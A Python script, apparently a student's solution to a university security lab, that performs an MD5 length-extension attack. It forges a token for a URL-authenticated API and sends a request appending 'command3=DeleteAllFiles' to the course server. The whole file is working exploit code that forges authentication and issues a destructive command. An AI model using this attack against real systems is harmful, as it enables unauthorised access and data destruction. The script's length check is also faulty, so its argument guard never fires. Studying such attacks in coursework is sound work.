
import sys
import urllib.parse
import http.client
from xml.dom.minidom import Document
from pymd5 import md5, padding

################################
if __name__ == '__main__':
    if len(sys.argv) < 1:
        print(f"usage: {sys.argv[0]} URL_TO_EXTEND", file=sys.stderr)   #! Addapted from ECEN4133 which i took.. rest of the code is modified to fit this assignment
        
        sys.exit(-1)

    # Get url from command line argument (argv)
    url = sys.argv[1]

#print(sys.argv[1])
#################################

    
#url = "https://csci3403.com/proj1/api?token=1e755d78dcb4d783b2573b8d04fcc48a&user=admin&command1=ListFiles&command2=NoOp"

urlList = urllib.parse.urlparse(url).query.split("&")     # creates a list of the url divided by '&'

#print(url)
#print(urllib.parse.urlparse(url).query.split("&") )
#print(urlList)
commands = urlList[1:]
#print(urlList)

length_of_m = len("&".join(commands)) + 8     # length of m (secret 8-byte password || the portion of the URL starting from the first command= )
token = urlList[0]

#print(token)

MD5ofm = token[6:]
#print(token[6:])

bits = (length_of_m + len(padding(length_of_m*8)))*8 

h = md5(state = bytes.fromhex(MD5ofm), count = bits)     # setting the initial internal state of our MD5 function to MD5(m)
h.update("&command3=DeleteAllFiles")                          # new command to Delete the files " x that is appended to m"
   
newtoken = "token=" + h.hexdigest()

#print(urlList[0])
#print(urllib.parse.quote(padding(length_of_m*8)))



url = urllib.parse.urlparse(url).scheme + "://" + urllib.parse.urlparse(url).netloc + urllib.parse.urlparse(url).path + "?" + newtoken + "&"+ "&".join(commands) + urllib.parse.quote(padding(length_of_m*8)) + "&command3=DeleteAllFiles"

#print (url)

parsed_url = urllib.parse.urlparse(url)
conn = http.client.HTTPSConnection(parsed_url.hostname, parsed_url.port)
conn.request("GET", parsed_url.path + "?" + parsed_url.query) 
print(conn.getresponse().read())